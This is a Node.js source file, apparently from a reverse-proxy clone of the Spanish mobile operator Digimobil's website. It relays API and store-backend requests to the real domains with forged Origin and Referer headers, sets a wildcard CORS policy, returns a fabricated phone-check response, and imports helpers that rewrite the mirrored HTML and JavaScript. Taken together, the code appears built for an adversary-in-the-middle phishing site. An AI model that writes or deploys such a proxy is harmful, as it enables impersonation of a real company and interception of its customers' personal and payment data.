const { SOURCE_DOMAIN } = require('./constants');
const fetch = require('node-fetch');
const { modifyHTML, modifyJavaScript } = require('./html-modifier');

function isApiRequest(url) {
  return url.pathname.startsWith('/api/');
}

function simulatePhoneCheckResponse(phone) {
  const id = Math.floor(Math.random() * 90000000) + 10000000;
  const phoneNumber = phone && phone.replace ? phone.replace(/[^\d]/g, '') : '';
  const finalPhoneNumber = phoneNumber.match(/^\d{9}$/) ? phoneNumber : '';
  
  return {
    code: 200,
    data: {
      id: id.toString(),
      charges: 0,
      country: "spania",
      number: finalPhoneNumber
    }
  };
}

async function modifyApiRequest(request, url, sourceDomain) {
  const headers = {};
  for (const [key, value] of Object.entries(request.headers)) {
    if (!['host', 'origin', 'referer', 'x-forwarded-host', 'x-forwarded-proto'].includes(key.toLowerCase())) {
      headers[key] = value;
    }
  }
  headers['Origin'] = `https://${sourceDomain}`;
  headers['Referer'] = `https://${sourceDomain}/`;

  let bodyContent = null;
  if (['POST', 'PUT', 'PATCH'].includes(request.httpMethod)) {
    const contentType = request.headers['content-type'] || '';
    try {
      if (contentType.includes('application/json')) {
        bodyContent = request.body ? JSON.stringify(JSON.parse(request.body)) : null;
      } else if (contentType.includes('application/x-www-form-urlencoded')) {
        bodyContent = request.body; // Already URL-encoded
      } else {
        bodyContent = request.body;
      }
    } catch (e) {
      console.error('Error processing request body:', e);
    }
  }

  try {
    const response = await fetch(`https://${sourceDomain}${url.pathname}${url.search || ''}`, {
      method: request.httpMethod,
      headers: headers,
      body: bodyContent,
      redirect: 'manual'
    });
    
    return response;
  } catch (error) {
    console.error('Error in modifyApiRequest:', error);
    throw error;
  }
}

async function followRedirects(response, headers, maxRedirects = 5) {
  let currentResponse = response;
  let redirectCount = 0;

  while (currentResponse.status >= 300 && currentResponse.status < 400 && redirectCount < maxRedirects) {
    const location = currentResponse.headers.get('Location');
    if (!location) break;

    let redirectUrl = location;
    if (location.startsWith('/')) {
      redirectUrl = `https://${SOURCE_DOMAIN}${location}`;
    } else if (!location.startsWith('http')) {
      redirectUrl = `https://${SOURCE_DOMAIN}/${location}`;
    }

    const redirectRequest = {
      method: 'GET',
      headers: headers,
      redirect: 'manual'
    };

    currentResponse = await fetch(redirectUrl, redirectRequest);
    redirectCount++;
  }

  return currentResponse;
}

async function handleStoreBackend(request, url) {
  const newPath = url.pathname.replace(/^\/store-backend/, '');
  const backendUrl = `https://store-backend.digimobil.es${newPath}${url.search}`;
  
  const headers = {};
  for (const [key, value] of Object.entries(request.headers)) {
    if (!['host', 'origin', 'referer', 'x-forwarded-host', 'x-forwarded-proto'].includes(key.toLowerCase())) {
      headers[key] = value;
    }
  }
  
  headers['Origin'] = 'https://store-backend.digimobil.es';
  headers['Referer'] = 'https://store-backend.digimobil.es/';

  let bodyContent = null;
  if (['POST', 'PUT', 'PATCH'].includes(request.httpMethod)) {
    const contentType = request.headers['content-type'] || '';
    try {
      bodyContent = request.body;
    } catch (e) {
      console.error('Error processing store-backend request body:', e);
    }
  }

  const backendRequest = {
    method: request.httpMethod,
    headers: headers,
    body: bodyContent,
    redirect: 'manual'
  };

  try {
    const backendResponse = await fetch(backendUrl, backendRequest);
    const newHeaders = new Headers(backendResponse.headers);
    newHeaders.set('Access-Control-Allow-Origin', '*');
    newHeaders.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    newHeaders.set('Access-Control-Allow-Headers', '*');

    return new Response(backendResponse.body, {
      status: backendResponse.status,
      headers: newHeaders
    });
  } catch (error) {
    console.error('Error in handleStoreBackend:', error);
    throw error;
  }
}

module.exports = {
  isApiRequest,
  simulatePhoneCheckResponse,
  modifyApiRequest,
  followRedirects,
  handleStoreBackend
};